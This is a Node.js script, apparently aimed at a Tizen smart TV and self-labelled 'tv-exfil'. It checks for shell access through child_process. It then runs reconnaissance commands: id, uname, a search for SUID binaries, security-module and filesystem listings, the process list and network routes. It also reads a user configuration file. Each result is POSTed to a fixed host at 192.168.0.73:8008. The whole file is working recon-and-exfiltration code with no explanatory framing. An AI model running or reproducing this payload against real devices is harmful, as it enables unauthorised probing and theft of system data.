var http = require('http');
var BEACON_HOST = '192.168.0.73';
var BEACON_PORT = 8008;

function beacon(obj) {
    var data = JSON.stringify(obj);
    var req = http.request({
        hostname: BEACON_HOST,
        port: BEACON_PORT,
        path: '/tv-results',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    });
    req.on('error', function(e) { console.log('beacon error: ' + e.message); });
    req.write(data);
    req.end();
}

// Step 1: confirm module loaded
beacon({source: "tv-exfil", step: 1, msg: "module loaded", ts: new Date().toISOString()});

async function main() {
    try {
        var cp;
        try {
            cp = require('child_process');
            beacon({source: "tv-exfil", step: 2, msg: "child_process OK", ts: new Date().toISOString()});
        } catch(e) {
            beacon({source: "tv-exfil", step: 2, msg: "child_process BLOCKED: " + e.message, ts: new Date().toISOString()});
            return;
        }

        var run = function(cmd, timeout) {
            return new Promise(function(resolve) {
                cp.exec(cmd, {timeout: timeout || 8000}, function(err, stdout, stderr) {
                    resolve({cmd: cmd, err: err ? err.message : null, out: stdout ? stdout.substring(0, 3000) : '', err_out: stderr ? stderr.substring(0, 500) : ''});
                });
            });
        };

        var results = {source: "tv-exfil", ts: new Date().toISOString(), cmds: []};

        results.cmds.push(await run('id'));
        beacon({source: "tv-exfil", step: 3, msg: "id", data: results.cmds[0], ts: new Date().toISOString()});

        results.cmds.push(await run('uname -a'));
        beacon({source: "tv-exfil", step: 4, msg: "uname", data: results.cmds[1], ts: new Date().toISOString()});

        results.cmds.push(await run('find / -perm -4000 -type f 2>/dev/null', 15000));
        beacon({source: "tv-exfil", step: 5, msg: "suid", data: results.cmds[2], ts: new Date().toISOString()});

        results.cmds.push(await run('cat /proc/security/lsm 2>/dev/null; ls /sys/fs/ 2>/dev/null'));
        results.cmds.push(await run('ps 2>/dev/null | head -40'));
        results.cmds.push(await run('cat /proc/net/route 2>/dev/null'));
        results.cmds.push(await run('cat /home/owner/share/.tizenbrewConfig.json 2>/dev/null'));

        beacon({source: "tv-exfil", step: 9, msg: "ALL", data: results, ts: new Date().toISOString()});
    } catch(e) {
        beacon({source: "tv-exfil", step: "ERR", msg: e.message, ts: new Date().toISOString()});
    }
}

main();
